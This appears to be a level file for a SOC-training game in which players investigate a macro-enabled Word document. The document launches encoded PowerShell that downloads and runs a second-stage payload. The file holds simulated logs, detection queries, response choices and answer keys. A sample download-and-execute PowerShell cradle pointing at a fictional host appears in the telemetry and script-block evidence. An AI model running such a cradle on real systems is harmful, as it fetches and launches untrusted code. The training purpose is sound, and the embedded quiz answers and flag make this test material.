@@ -1,0 +1,212 @@
+{
+  "index": 2,
+  "id": "execution_fields",
+  "name": "The Execution Fields",
+  "phase": "Detection & Analysis",
+  "lesson": "Process trees: spotting odd parent/child relationships, decoding encoded PowerShell, and pivoting from a process to its network activity.",
+  "attack": ["T1204.002", "T1059.001"],
+  "accent": "#3df5c8",
+  "window": ["2026-11-17T08:30:00Z", "2026-11-17T09:40:00Z"],
+  "clock": {"rate": 1.1, "start": 14, "reset": 72},
+  "map_seed": 202,
+  "pivot_tip": "Pivot on the parent field. Office apps almost never have a reason to launch a shell.",
+  "reaction": "updchk.exe just rotated its sleep timer. VELVET LOCUST felt the SOC move.",
+  "nodes": [
+    {"id": "ws0142", "host": "WS-FIN-0142", "label": "Mira's Workstation", "ip": "10.20.4.142", "role": "Finance workstation (m.okafor)", "evidence": ["e201"]},
+    {"id": "edr", "host": "EDR-CON", "label": "EDR Console", "ip": "10.20.99.40", "role": "Endpoint detection and response", "evidence": ["e202"]},
+    {"id": "proxy", "host": "PROXY-01", "label": "Web Proxy", "ip": "10.20.0.30", "role": "Outbound web proxy", "evidence": ["e203"]},
+    {"id": "intel", "host": "LAB-NOTES", "label": "Analyst Lab Notes", "ip": "10.20.99.41", "role": "Team knowledge base", "evidence": ["e205"]}
+  ],
+  "evidence": {
+    "e201": {
+      "title": "EDR alert: Office spawned PowerShell", "type": "edr_alert", "host": "WS-FIN-0142", "time": "2026-11-17T09:14:22Z",
+      "lines": [
+        "ALERT  : Suspicious child process of Office application   Severity: HIGH",
+        "Host   : WS-FIN-0142 (10.20.4.142)    User: HALCYON\\m.okafor",
+        "Parent : WINWORD.EXE (pid 4120)",
+        "Child  : powershell.exe (pid 5532)",
+        "Flags  : -NoP -NonI -W Hidden -Enc <long Base64 string>",
+        "Action : Detected, not blocked (policy = audit)"
+      ],
+      "tip": "Word spawning PowerShell with a hidden window and an encoded command is one of the most reliable phishing execution signals."
+    },
+    "e202": {
+      "title": "EDR process tree: WS-FIN-0142", "type": "process_tree", "host": "EDR-CON", "time": "2026-11-17T09:15:10Z",
+      "lines": [
+        "explorer.exe (3020)",
+        "  └─ WINWORD.EXE (4120)  Invoice_Q3_8841.docm",
+        "       └─ powershell.exe (5532)  -NoP -NonI -W Hidden -Enc ...",
+        "            └─ updchk.exe (6012)  C:\\ProgramData\\HalcyonSvc\\updchk.exe",
+        "                 └─ cmd.exe (6100)  /c whoami /all",
+        "",
+        "updchk.exe: unsigned, first seen 09:14:58, prevalence 1 host in the fleet"
+      ],
+      "tip": "Prevalence of 1 means one machine in the whole company has ever run this file. Rare is suspicious."
+    },
+    "e203": {
+      "title": "Proxy log: cdn.halcyon-support.test", "type": "proxy", "host": "PROXY-01", "time": "2026-11-17T09:14:24Z",
+      "lines": [
+        "2026-11-17 09:14:24 10.20.4.142 GET https://cdn.halcyon-support.test/upd/updchk.bin",
+        "    dst=203.0.113.66 status=200 bytes_in=218112 category=Uncategorized",
+        "    user_agent=Mozilla/5.0 (Windows NT; Windows NT 10.0) WindowsPowerShell/5.1",
+        "2026-11-17 09:15:10 10.20.4.142 GET https://stat-sync.example/api/v2/sync?id=hf0142",
+        "    dst=203.0.113.66 status=200 bytes_out=512 category=Uncategorized"
+      ],
+      "tip": "A PowerShell user agent fetching a .bin from an uncategorized look-alike domain is a download cradle."
+    },
+    "e204": {
+      "title": "Script Block Log (4104): decoded command", "type": "wineventlog", "host": "WS-FIN-0142", "time": "2026-11-17T09:14:21Z",
+      "lines": [
+        "EventID 4104  Microsoft-Windows-PowerShell/Operational",
+        "Creating Scriptblock text (1 of 1):",
+        "  (New-Object Net.WebClient).DownloadFile(",
+        "     'https://cdn.halcyon-support.test/upd/updchk.bin',",
+        "     'C:\\ProgramData\\HalcyonSvc\\updchk.exe');",
+        "  Start-Process 'C:\\ProgramData\\HalcyonSvc\\updchk.exe'",
+        "[inert training sample: domains are fictional and unreachable]"
+      ],
+      "tip": "Script Block Logging records the decoded script even when the command line was encoded. Turn it on everywhere."
+    },
+    "e205": {
+      "title": "Lab note: reading process trees", "type": "note", "host": "LAB-NOTES", "time": "2026-11-17T07:00:00Z",
+      "lines": [
+        "NORMAL PARENTS                        SUSPICIOUS PARENTS",
+        "explorer.exe -> winword.exe           winword.exe -> powershell.exe",
+        "winword.exe  -> splwow64.exe (print)  excel.exe   -> cmd.exe",
+        "services.exe -> svchost.exe           outlook.exe -> wscript.exe",
+        "",
+        "PowerShell red flags: -Enc / -EncodedCommand, -W Hidden, -NoP, download",
+        "cradles (DownloadFile, DownloadString, Invoke-WebRequest), IEX.",
+        "Encoded commands are UTF-16LE Base64. The terminal's decode handles that."
+      ],
+      "tip": "Know the normal parent for each process. Then anything else stands out."
+    }
+  },
+  "telemetry": {
+    "proc": {
+      "description": "Process creation (Sysmon Event 1), finance and engineering hosts",
+      "columns": ["id", "time", "host", "user", "parent", "name", "cmdline"],
+      "noise": 46,
+      "rows": [
+        {"id": "p-201", "time": "2026-11-17T09:14:03Z", "host": "WS-FIN-0142", "user": "m.okafor", "parent": "explorer.exe", "name": "winword.exe", "cmdline": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\m.okafor\\Downloads\\Invoice_Q3_8841.docm\"", "pid": 4120, "ppid": 3020},
+        {"id": "p-202", "time": "2026-11-17T09:14:21Z", "host": "WS-FIN-0142", "user": "m.okafor", "parent": "winword.exe", "name": "powershell.exe", "cmdline": "powershell.exe -NoP -NonI -W Hidden -Enc [[base64u16:(New-Object Net.WebClient).DownloadFile('https://cdn.halcyon-support.test/upd/updchk.bin','C:\\ProgramData\\HalcyonSvc\\updchk.exe'); Start-Process 'C:\\ProgramData\\HalcyonSvc\\updchk.exe']]", "pid": 5532, "ppid": 4120},
+        {"id": "p-203", "time": "2026-11-17T09:15:02Z", "host": "WS-FIN-0142", "user": "m.okafor", "parent": "powershell.exe", "name": "updchk.exe", "cmdline": "\"C:\\ProgramData\\HalcyonSvc\\updchk.exe\"", "pid": 6012, "ppid": 5532},
+        {"id": "p-204", "time": "2026-11-17T09:15:40Z", "host": "WS-FIN-0142", "user": "m.okafor", "parent": "updchk.exe", "name": "cmd.exe", "cmdline": "cmd.exe /c whoami /all", "pid": 6100, "ppid": 6012},
+        {"id": "p-205", "time": "2026-11-17T09:02:12Z", "host": "WS-ENG-0217", "user": "d.kowalski", "parent": "excel.exe", "name": "splwow64.exe", "cmdline": "C:\\Windows\\splwow64.exe 12288", "pid": 7720, "ppid": 7012}
+      ]
+    },
+    "net": {
+      "description": "Network connections (Sysmon Event 3)",
+      "columns": ["id", "time", "host", "name", "src", "dst", "dport", "domain", "bytes_out", "bytes_in"],
+      "noise": 30,
+      "rows": [
+        {"id": "n-201", "time": "2026-11-17T09:14:24Z", "host": "WS-FIN-0142", "user": "m.okafor", "name": "powershell.exe", "src": "10.20.4.142", "dst": "203.0.113.66", "dport": 443, "proto": "tcp", "domain": "cdn.halcyon-support.test", "bytes_out": 1840, "bytes_in": 218112},
+        {"id": "n-202", "time": "2026-11-17T09:15:10Z", "host": "WS-FIN-0142", "user": "m.okafor", "name": "updchk.exe", "src": "10.20.4.142", "dst": "203.0.113.66", "dport": 443, "proto": "tcp", "domain": "stat-sync.example", "bytes_out": 512, "bytes_in": 128}
+      ]
+    }
+  },
+  "objectives": [
+    {
+      "id": "o1", "type": "collect", "title": "Read the EDR alert",
+      "desc": "Investigate Mira's workstation, WS-FIN-0142.",
+      "evidence": ["e201"],
+      "hints": ["Mira's workstation is a node in this zone.", "Find WS-FIN-0142 and press E.", "Open 'EDR alert: Office spawned PowerShell'."]
+    },
+    {
+      "id": "o2", "type": "query", "title": "Find the odd parent/child pair",
+      "desc": "Hunt for PowerShell launched by Word.",
+      "table": "proc", "required": ["p-202"], "max_rows": 2,
+      "solution": "search proc where parent=\"winword.exe\" and name=\"powershell.exe\"",
+      "success": "There it is: Word launched PowerShell.",
+      "dialogue": ["z2_o2_p"],
+      "hints": ["You want rows where the parent is Word AND the process is PowerShell.", "Two conditions joined with 'and'.", "search proc where parent=\"winword.exe\" and name=\"powershell.exe\""]
+    },
+    {
+      "id": "o3", "type": "decode", "title": "Decode the hidden command",
+      "desc": "The -Enc argument is Base64. Decode it: decode base64 p-202 (decode can read a row by its id).",
+      "answer_contains": "cdn.halcyon-support.test",
+      "solution": "decode base64 p-202",
+      "reward_evidence": ["e204"],
+      "success": "Decoded: a download cradle pulling updchk.exe from a look-alike domain.",
+      "hints": ["The terminal's decode command can take a row id instead of the raw text.", "PowerShell encodes commands as UTF-16LE Base64; decode handles it.", "decode base64 p-202"]
+    },
+    {
+      "id": "o4", "type": "query", "title": "What did PowerShell launch?",
+      "desc": "Pivot: find processes whose parent was PowerShell on WS-FIN-0142.",
+      "table": "proc", "required": ["p-203"], "max_rows": 2,
+      "solution": "search proc where parent=\"powershell.exe\" and host=\"WS-FIN-0142\"",
+      "success": "updchk.exe: the second stage.",
+      "hints": ["Now the PowerShell process becomes the parent.", "IT admins run PowerShell scripts on IT-ADM-03 too, so filter by host.", "search proc where parent=\"powershell.exe\" and host=\"WS-FIN-0142\""]
+    },
+    {
+      "id": "o5", "type": "query", "title": "Where did it call out?",
+      "desc": "Pivot to the network table: which connections did powershell.exe make?",
+      "table": "net", "required": ["n-201"], "max_rows": 2,
+      "solution": "search net where name=\"powershell.exe\"",
+      "success": "203.0.113.66 via cdn.halcyon-support.test. Note it: you'll see that IP again.",
+      "hints": ["The net table also has a 'name' field for the process.", "Filter the net table on the PowerShell process name.", "search net where name=\"powershell.exe\""]
+    },
+    {
+      "id": "o6", "type": "collect", "title": "Corroborate",
+      "desc": "Collect the EDR process tree and the proxy log.",
+      "evidence": ["e202", "e203"],
+      "hints": ["Two nodes left with key evidence: the EDR console and the proxy.", "Press E at EDR-CON and PROXY-01.", "Open the process tree and the proxy log."]
+    },
+    {
+      "id": "o7", "type": "timeline", "title": "Rebuild the execution timeline",
+      "desc": "Press L. Drag the events into the order they happened, then press C to check.",
+      "events": [
+        {"id": "t1", "label": "Lure email delivered to Mira"},
+        {"id": "t2", "label": "Mira opens Invoice_Q3_8841.docm and enables content"},
+        {"id": "t3", "label": "Word spawns hidden, encoded PowerShell"},
+        {"id": "t4", "label": "PowerShell downloads updchk.bin from cdn.halcyon-support.test"},
+        {"id": "t5", "label": "updchk.exe executes from C:\\ProgramData\\HalcyonSvc"},
+        {"id": "t6", "label": "updchk.exe checks in to stat-sync.example"}
+      ],
+      "success": "Timeline holds: delivery, user execution, script, download, payload, check-in.",
+      "hints": ["Causality: something has to be downloaded before it can run.", "The email comes first, the check-in last.", "Delivered, opened, PowerShell, download, updchk.exe runs, check-in."]
+    },
+    {
+      "id": "o8", "type": "choice", "board": true, "title": "Form a hypothesis",
+      "desc": "Press B. Pin the proof and choose what happened.",
+      "prompt": "What happened in the Execution Fields?",
+      "pins": ["e201", "e204"],
+      "options": [
+        {"id": "a", "text": "Mira opened the document and its macro ran hidden, encoded PowerShell that downloaded and launched a second-stage payload", "correct": true},
+        {"id": "b", "text": "An IT admin ran a patch script on Mira's machine", "feedback": "IT scripts run from IT-ADM-03 and aren't launched by Word with hidden encoded commands."},
+        {"id": "c", "text": "Windows Update downloaded a legitimate update", "feedback": "Windows Update doesn't run from Word or use halcyon-support.test."},
+        {"id": "d", "text": "The attacker logged in remotely and ran PowerShell", "feedback": "The parent is WINWORD.EXE. This started with the user opening the file."}
+      ],
+      "success": "Confirmed: user execution, then PowerShell.",
+      "hints": ["Pin the EDR alert and the decoded script block log.", "Who started the chain: a person opening a file, or a remote login?", "Pin e201 and e204, then choose the macro / PowerShell option."]
+    },
+    {
+      "id": "o9", "type": "map", "title": "Map it to ATT&CK",
+      "desc": "Press M and map both findings.",
+      "findings": ["f1", "f2"],
+      "hints": ["Both findings are about getting code to run.", "Execution column: User Execution and Command and Scripting Interpreter.", "f1 -> T1204.002 Malicious File; f2 -> T1059.001 PowerShell (both Execution)."]
+    },
+    {
+      "id": "o10", "type": "respond", "title": "Respond",
+      "desc": "Press R. Preserve evidence, then contain the payload.",
+      "hints": ["Volatile evidence disappears when you kill processes.", "Capture memory before killing updchk.exe.", "Memory image, kill updchk.exe, block the domain/IP, blocklist the hash."]
+    }
+  ],
+  "findings": {
+    "f1": {"text": "Mira opened the macro-enabled attachment and enabled content", "technique": "T1204.002", "tactics": ["TA0002"], "hint": "The user had to open the file for anything to happen.", "success": "T1204.002 lit: User Execution."},
+    "f2": {"text": "Word launched hidden, encoded PowerShell that downloaded updchk.exe", "technique": "T1059.001", "tactics": ["TA0002"], "hint": "Which interpreter ran the encoded command?", "success": "T1059.001 lit: PowerShell."}
+  },
+  "responses": [
+    {"id": "r1", "label": "Capture a memory image of WS-FIN-0142", "description": "Use EDR to grab a full RAM image before touching anything.", "tradeoff": "Takes a few minutes. Preserves decoded configs, keys, and injected code.", "outcome": "good", "required": true, "feedback": "Memory captured. updchk.exe's config (C2: stat-sync.example) is in there."},
+    {"id": "r2", "label": "Kill the updchk.exe process", "description": "Terminate pid 6012 on WS-FIN-0142.", "tradeoff": "Stops it now, but anything only in memory is lost.", "outcome": "good", "required": true, "requires": ["r1"], "clears": ["ws0142"], "too_early": "Killing it first destroys what's only in memory: decoded config, C2 keys. Capture memory first.", "feedback": "updchk.exe terminated after memory capture."},
+    {"id": "r3", "label": "Block cdn.halcyon-support.test and 203.0.113.66 at the proxy", "description": "Deny the download domain and its IP for every host.", "tradeoff": "Low risk; cheap for them to change, but stops reinfection from this lure.", "outcome": "good", "required": true, "clears": ["proxy"], "feedback": "Blocked at the proxy."},
+    {"id": "r4", "label": "Add updchk.exe's SHA-256 to the EDR blocklist", "description": "Prevent the exact file from running anywhere.", "tradeoff": "Bottom of the Pyramid of Pain, but free and instant.", "outcome": "good", "required": true, "feedback": "Hash blocked fleet-wide."},
+    {"id": "r5", "label": "Reimage WS-FIN-0142 immediately", "description": "Wipe and reinstall Mira's workstation now.", "tradeoff": "Destroys all evidence before you know the scope.", "outcome": "premature", "clock": 6, "feedback": "Too early. Wiping destroys the evidence and tells them you've found this foothold, before you know what else they touched."},
+    {"id": "r6", "label": "Disable PowerShell on every computer in the company", "description": "Push a policy blocking powershell.exe everywhere.", "tradeoff": "Breaks IT automation; attackers have other interpreters.", "outcome": "bad", "clock": 3, "feedback": "IT's patching and inventory scripts just broke. Prefer logging, Constrained Language Mode, and blocking Office child processes."}
+  ],
+  "puzzle": {"title": "CTF Cache: Execution Fields", "encoding": "hex", "answer": "FLAG{winword_should_not_spawn_shells}", "points": 25, "clue": "Two hex digits per character. Try: decode hex cache"},
+  "dialogue": {
+    "intro": ["z2_intro_o", "z2_intro_p"],
+    "outro": ["z2_outro_p", "z2_outro_o"]
+  }
+}
